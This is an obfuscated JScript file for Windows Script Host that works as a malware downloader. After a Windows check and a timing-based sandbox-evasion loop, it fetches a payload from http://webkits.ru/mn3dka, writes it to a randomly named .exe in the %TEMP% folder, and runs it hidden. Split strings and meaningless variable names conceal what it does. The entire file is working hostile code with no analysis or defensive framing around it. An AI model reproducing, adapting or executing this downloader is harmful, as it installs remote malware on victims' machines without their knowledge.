var D = false;
var E = "Create"+"Object";
var VV = function Q() {return WScript[E]("WScript"+".Shell");}(), B = 11;
var O = "MSXML2"+".XMLHTTP";
var N = 2;
var W = N - 2;
function T0(OQ){VV["Run"](OQ, W, W);};
function NB(){return O + "";};
function H(O0, QL){W = W * 1; return O0 - QL;};
function OZ(){return E;};
/*@cc_on
  @if (@_win32 || @_win64)
    D = true;
  @end
@*/
if (D)
{
var BN = "";
function NY(){return 22;};
var Y = 0; var P = 0;
function T()
{
var XQ = new this["Date"]();
var EC = XQ["getUTCMilliseconds"]();
WScript["Sleep"](NY());
var XQ = new this["Date"]();
var U = XQ["getUTCMilliseconds"]();
WScript["Sleep"](NY());
var XQ = new this["Date"]();
var Z = XQ["getUTCMilliseconds"]();
var Y = "UU";
Y = H(U, EC);
var P = "S";
P = H(Z, U);
BN = "open";
return H(Y, P);
}
var S0 = false;
var NQ = false;
for (var HT = W; HT < NY() * 1; HT++){if (T() != W){
S0 = true; 
P = "31" + 11 * Y + P; 
NQ = true; 
break;
}}
function R() {return ((S0 == true) && (S0 == NQ)) ? 1 : W;};
if (S0 && R() && NQ){
function KI() {return VV["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "0xkXdLDZQsFG3VIL.ex" + "e";};
 ZE = NB();
 R0 = WScript[E](ZE);
 var HH = 1;
do { 
	for (;HH;){
	try {
		if (HH == 1)
		{
			R0[BN]("GET", "http://webkits.ru/mn3dka", false);
			R0["send"]();
			F = "Sleep";
			HH = 2;
		}
		WScript[F](NY() + 120); 
		if (R0["readystate"] < 2 * 2) continue;
		HH = W;
		function DL(EO) {var K = (1, 2, 3, 4, 5, EO); return K;};
		AE = WScript[OZ()]("ADODB.Stream");
		ZE = AE;
		ZE[BN]();
		ZE["type"] = DL(1);
		ZE["write"](R0["ResponseBody"]);
		AE["position"] = DL(W);
		ZE["Save" + "ToFile"](KI(), 2);
		AE["cl"+"ose"]();
		C = KI();
		T0(C);
	} catch(Y0){};};
}while (HH);
}
}

